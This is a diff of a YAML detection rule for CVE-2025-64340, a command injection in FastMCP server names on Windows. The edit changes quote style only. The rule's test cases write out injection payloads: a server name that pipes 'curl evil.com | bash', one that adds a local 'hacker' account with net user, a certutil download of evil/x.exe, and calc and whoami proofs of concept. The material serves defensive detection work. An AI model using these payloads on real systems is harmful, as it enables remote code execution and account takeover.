@@ -1,4 +1,4 @@
-title: "FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340)"
+title: 'FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340)'
 id: ATR-2026-00537
 rule_version: 1
 status: draft
@@ -20,27 +20,27 @@ description: >
   Scan target: MCP exchange (tool_response, content) and user_input for
   configuration payloads. False-positive rate expected low because legitimate
   server names do not require & | > ^ ( ).
-author: "ATR Community"
-date: "2026/05/28"
-schema_version: "0.1"
+author: 'ATR Community'
+date: '2026/05/28'
+schema_version: '0.1'
 detection_tier: pattern
 maturity: draft
 severity: high
 
 references:
   owasp_llm:
-    - "LLM05:2025 - Improper Output Handling"
+    - 'LLM05:2025 - Improper Output Handling'
   owasp_agentic:
-    - "ASI05:2026 - Unexpected Code Execution"
-    - "ASI04:2026 - Supply Chain"
+    - 'ASI05:2026 - Unexpected Code Execution'
+    - 'ASI04:2026 - Supply Chain'
   mitre_atlas:
-    - "AML.T0049 - Exploit Public-Facing Application"
-    - "AML.T0040 - ML Model Inference API Access"
+    - 'AML.T0049 - Exploit Public-Facing Application'
+    - 'AML.T0040 - ML Model Inference API Access'
   mitre_attack:
-    - "T1059.003 - Windows Command Shell"
-    - "T1190 - Exploit Public-Facing Application"
+    - 'T1059.003 - Windows Command Shell'
+    - 'T1190 - Exploit Public-Facing Application'
   cve:
-    - "CVE-2025-64340"
+    - 'CVE-2025-64340'
 
 metadata_provenance:
   mitre_atlas: human-reviewed
@@ -49,48 +49,48 @@ metadata_provenance:
 
 compliance:
   eu_ai_act:
-    - article: "15"
+    - article: '15'
       context: >
         CVE-2025-64340 FastMCP server-name injection reaches cmd.exe via .cmd
         wrapper on Windows; Article 15 cybersecurity requirements mandate that
         AI tool installation surfaces sanitize user-controlled identifier fields
         before shell execution.
       strength: primary
-    - article: "9"
+    - article: '9'
       context: >
         Article 9 risk management must enumerate Windows cmd.exe metacharacter
         injection via MCP server name as a high-risk supply-chain attack vector
         in agent tool installation pipelines.
       strength: secondary
   nist_ai_rmf:
-    - subcategory: "MP.5.1"
+    - subcategory: 'MP.5.1'
       context: >
         Adversarial inputs supplying shell metacharacters in MCP server name
         fields reach an OS exec sink through FastMCP install; MP.5.1 requires
         this input class to be tracked and scanned at agent tool-registration
         surfaces.
       strength: primary
-    - subcategory: "MG.2.3"
+    - subcategory: 'MG.2.3'
       context: >
         Risk treatment plans under MG.2.3 must enforce allowlists of
         `[A-Za-z0-9\-_.\ ]` on any MCP server name field that flows into a
         shell-backed installer, mirroring the FastMCP 3.2.0 patch.
       strength: secondary
-    - subcategory: "MS.2.7"
+    - subcategory: 'MS.2.7'
       context: "NIST AI RMF MEASURE 2.7 (security and resilience evaluated and documented) is supported by this rule's runtime detection of the tool-poisoning technique (FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340))."
       strength: primary
-    - subcategory: "MG.3.2"
-      context: "NIST AI RMF MANAGE 3.2 (pre-trained models monitored as part of maintenance) is supported where this rule detects the tool-poisoning technique (FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340))."
+    - subcategory: 'MG.3.2'
+      context: 'NIST AI RMF MANAGE 3.2 (pre-trained models monitored as part of maintenance) is supported where this rule detects the tool-poisoning technique (FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340)).'
       strength: secondary
   iso_42001:
-    - clause: "8.1"
+    - clause: '8.1'
       context: >
         Operational controls under clause 8.1 must detect cmd.exe metacharacters
         in MCP server name fields to prevent installation-time command injection
         on Windows agent infrastructure.
       strength: primary
-    - clause: "8.3"
-      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) is supported by this rule, which implements runtime detection of the tool-poisoning technique (FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340)) as a treatment control."
+    - clause: '8.3'
+      context: 'ISO/IEC 42001 Clause 8.3 (AI risk treatment) is supported by this rule, which implements runtime detection of the tool-poisoning technique (FastMCP Windows cmd.exe Injection via Server Name Metacharacters (CVE-2025-64340)) as a treatment control.'
       strength: secondary
 
 tags:
@@ -112,9 +112,9 @@ agent_source:
 detection:
   condition: any
   false_positives:
-    - "Security advisory text quoting the CVE-2025-64340 PoC payload for documentation purposes."
-    - "MCP server names that are legitimate shell scripts being discussed in educational content."
-    - "Escaped/quoted server names in a context that clearly does not flow to a FastMCP installer."
+    - 'Security advisory text quoting the CVE-2025-64340 PoC payload for documentation purposes.'
+    - 'MCP server names that are legitimate shell scripts being discussed in educational content.'
+    - 'Escaped/quoted server names in a context that clearly does not flow to a FastMCP installer.'
   conditions:
     - field: content
       operator: regex
@@ -172,50 +172,50 @@ test_cases:
   true_positives:
     - input: 'mcp = FastMCP(name="test&calc")'
       expected: triggered
-      description: "Exact CVE-2025-64340 PoC: ampersand in FastMCP name triggers calc.exe on Windows"
+      description: 'Exact CVE-2025-64340 PoC: ampersand in FastMCP name triggers calc.exe on Windows'
     - input: 'server = FastMCP(name="my-server|(curl evil.com | bash)")'
       expected: triggered
-      description: "Pipe metacharacter in FastMCP name executing remote payload"
+      description: 'Pipe metacharacter in FastMCP name executing remote payload'
     - input: 'fastmcp install claude-code my-server&whoami'
       expected: triggered
-      description: "fastmcp install CLI with & chaining whoami after the server arg"
+      description: 'fastmcp install CLI with & chaining whoami after the server arg'
     - input: '{"name": "my-mcp&net user hacker P@ss /add", "transport": "stdio"}'
       expected: triggered
-      description: "JSON MCP config with name field injecting net user command via &"
+      description: 'JSON MCP config with name field injecting net user command via &'
     - input: 'server_name = "docs-server^&certutil -urlcache -split -f http://evil/x.exe x.exe"'
       expected: triggered
-      description: "server_name variable with ^ escape + & command chaining for certutil download"
+      description: 'server_name variable with ^ escape + & command chaining for certutil download'
     - input: 'mcp_name: "weather>%TEMP%\\evil.bat"'
       expected: triggered
-      description: "YAML mcp_name field with > redirect writing a bat file"
+      description: 'YAML mcp_name field with > redirect writing a bat file'
     - input: >-
         CVE-2025-64340 exploit: FastMCP(name="test&calc") opens Calculator
         via cmd.exe metacharacter injection in fastmcp install cursor path.
       expected: triggered
-      description: "Attack framing text referencing CVE and PoC in skill description"
+      description: 'Attack framing text referencing CVE and PoC in skill description'
     - input: '{"name": "my(server)name", "command": "npx", "args": ["@mcp/server"]}'
       expected: triggered
-      description: "Parentheses in server name — cmd.exe grouping metacharacters"
+      description: 'Parentheses in server name — cmd.exe grouping metacharacters'
 
   true_negatives:
     - input: 'mcp = FastMCP(name="my-documentation-server")'
       expected: not_triggered
-      description: "Legitimate FastMCP name with only alphanumerics and hyphens"
+      description: 'Legitimate FastMCP name with only alphanumerics and hyphens'
     - input: 'mcp = FastMCP(name="weather_api_v2")'
       expected: not_triggered
-      description: "Underscore-separated name — safe character set per FastMCP 3.2.0 allowlist"
+      description: 'Underscore-separated name — safe character set per FastMCP 3.2.0 allowlist'
     - input: '{"name": "filesystem-server", "command": "npx", "args": ["@modelcontextprotocol/server-filesystem", "/data"]}'
       expected: not_triggered
-      description: "Standard MCP server config with safe name field"
-    - input: "Install FastMCP 3.2.0 to receive the patch for CVE-2025-64340."
+      description: 'Standard MCP server config with safe name field'
+    - input: 'Install FastMCP 3.2.0 to receive the patch for CVE-2025-64340.'
       expected: not_triggered
-      description: "Mitigation advisory text without exploit content"
+      description: 'Mitigation advisory text without exploit content'
     - input: 'fastmcp install cursor my-server'
       expected: not_triggered
-      description: "fastmcp install with safe server name, no metacharacters"
+      description: 'fastmcp install with safe server name, no metacharacters'
     - input: '{"name": "openai-proxy", "transport": "sse", "url": "http://localhost:8080"}'
       expected: not_triggered
-      description: "SSE transport MCP config with safe name — not a shell-backed install path"
+      description: 'SSE transport MCP config with safe name — not a shell-backed install path'
 
 evasion_tests:
   - input: 'FastMCP(name="test" + "&calc")'
